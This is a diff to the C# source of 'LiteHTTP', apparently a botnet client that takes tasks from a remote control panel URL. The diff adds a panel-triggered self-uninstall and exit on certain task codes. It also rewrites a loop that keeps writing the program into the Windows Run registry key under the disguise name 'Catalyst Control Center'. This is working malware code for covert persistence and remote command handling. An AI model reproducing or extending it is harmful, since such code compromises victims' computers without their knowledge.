@@ -8,11 +8,12 @@ namespace LiteHTTP
 {
     class Program
     {
+        public static Thread s;
         static void Main(string[] args)
         {
             Thread x = new Thread(new ThreadStart(mainthread));
             x.Start();
-            Thread s = new Thread(new ThreadStart(startthread));
+            s = new Thread(new ThreadStart(startthread));
             //s.Start();
         }
 
@@ -52,6 +53,11 @@ namespace LiteHTTP
                             {
                                 // notify panel that task has completed
                                 Communication.makeRequest(Settings.panelurl, par + "&op=1&td=" + tid);
+                                if (Encoding.UTF8.GetString(Convert.FromBase64String(sps[2])) == "10" || Encoding.UTF8.GetString(Convert.FromBase64String(sps[2])) == "9")
+                                {
+                                    Communication.makeRequest(Settings.panelurl, par + "&uni=1");
+                                    Environment.Exit(0);
+                                }
                             }
                         }
                     }
@@ -66,18 +72,12 @@ namespace LiteHTTP
             do
             {
                 // we wrap this in a try catch block to avoid errors with already existing keys / values
-                try {
-                    if (Misc.isAdmin()) // automatically use HKLM if running with admin rights
-                    {
-                        RegistryKey reg = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-                        reg.SetValue("Catalyst Control Center", "\"" + Misc.getLocation() + "\"", RegistryValueKind.String);
-                    }
-                    else
-                    {
-                        RegistryKey reg = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-                        reg.SetValue("Catalyst Control Center", "\"" + Misc.getLocation() + "\"", RegistryValueKind.String);
-                    }
-                } catch {}
+                try
+                {
+                    RegistryKey reg = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                    reg.SetValue("Catalyst Control Center", "\"" + Misc.getLocation() + "\"", RegistryValueKind.String);
+                }
+                catch { } 
                 Thread.Sleep(3000);
             } while (true);
         }
